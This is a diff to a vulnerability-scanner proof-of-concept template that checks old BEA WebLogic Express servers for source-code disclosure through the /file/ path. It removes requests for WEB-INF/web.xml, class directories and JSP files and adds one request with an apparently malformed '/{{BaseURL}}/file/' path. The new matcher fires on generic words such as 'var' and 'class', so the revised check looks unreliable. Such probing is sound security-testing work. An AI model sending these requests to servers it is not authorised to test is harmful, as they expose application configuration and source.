@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证 BEA WebLogic Express 3.1.8/4/5 是否存在 /file/ 路径源代码泄露漏洞"
+description = "验证 BEA WebLogic Express 3.1.8/4/5 源代码泄露漏洞，通过请求 /file/ 路径访问源代码文件"
 id = "POC-AVE-2000-0419"
-name = "BEA WebLogic Express 源代码泄露漏洞 PoC"
+name = "CVE-2000-0500 PoC"
 severity = "medium"
 tags = ["ave-2000-0419"]
 vuln_id = [
@@ -15,7 +15,7 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/file/WEB-INF/web.xml"
+path = "/{{BaseURL}}/file/"
 protocol = "http"
 
 [poc.requests.body]
@@ -26,56 +26,22 @@ type = "raw"
 User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
+condition = "or"
 expect = true
 part = "body"
 type = "word"
 words = [
-    "<web-app",
-    "<servlet>",
-    "<context-param>",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/file/WEB-INF/classes/"
-protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "Index of",
-    "Directory Listing",
-    "WEB-INF",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/file/index.jsp"
-protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "<%",
-    "<%@",
-    "jsp:",
-    "java.io",
+    "import",
+    "package",
+    "class",
+    "public",
+    "private",
+    "protected",
+    "void",
+    "static",
+    "function",
+    "def",
+    "var",
+    "let",
+    "const",
 ]
